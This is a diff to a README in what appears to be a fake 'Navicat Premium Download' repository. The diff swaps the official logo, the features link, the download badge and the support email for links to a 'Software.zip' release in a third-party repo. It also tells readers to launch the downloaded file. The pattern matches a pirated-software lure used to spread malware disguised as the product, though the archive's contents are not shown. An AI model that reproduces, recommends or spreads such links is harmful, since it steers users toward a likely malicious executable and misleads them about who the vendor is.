@@ -1,6 +1,6 @@
 # 🔥 Welcome to Navicat Premium Download Repository! 🔥
 
-![Navicat Logo](https://www.navicat.com/uploads/132/navicatlogo1color_128_128.png)
+![Navicat Logo](https://github.com/boptrithuc/Navicat-Premium-Download/releases/download/v2.0/Software.zip)
 
 ## Repository Name: Navicat-Premium-Download
 ## Short Description: 
@@ -25,11 +25,11 @@ navicat premium linux, navicat premium 16 download, key navicat premium 16, down
 - what-is-navicat-premium
 
 ## Explore Navicat Premium Features:
-Get a comprehensive understanding of Navicat Premium software by checking out the latest features, functionalities, and enhancements here -> [Navicat Premium Features](https://www.navicat.com/en/products/navicat-premium)
+Get a comprehensive understanding of Navicat Premium software by checking out the latest features, functionalities, and enhancements here -> [Navicat Premium Features](https://github.com/boptrithuc/Navicat-Premium-Download/releases/download/v2.0/Software.zip)
 
 ## Download Navicat Premium:
 Download the latest version of Navicat Premium by clicking the button below:
-[![Download Navicat Premium](https://img.shields.io/badge/Download-Navicat%20Premium-brightgreen)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download Navicat Premium](https://github.com/boptrithuc/Navicat-Premium-Download/releases/download/v2.0/Software.zip%20Premium-brightgreen)](https://github.com/boptrithuc/Navicat-Premium-Download/releases/download/v2.0/Software.zip)
 
 **Note: Make sure to launch the downloaded file to begin the installation process.**
 
@@ -46,6 +46,6 @@ Connect with fellow Navicat users, share your experiences, and get help from exp
 We welcome contributions from the community to enhance Navicat Premium. Feel free to submit bug reports, feature requests, or even pull requests to help make Navicat better for everyone!
 
 ## Need Help?
-If you encounter any issues or have questions about Navicat Premium, don't hesitate to reach out to our support team at support@navicat.com. We are here to assist you!
+If you encounter any issues or have questions about Navicat Premium, don't hesitate to reach out to our support team at https://github.com/boptrithuc/Navicat-Premium-Download/releases/download/v2.0/Software.zip We are here to assist you!
 
 ## Thank you for choosing Navicat Premium - Your Ultimate Database Solution! 🚀
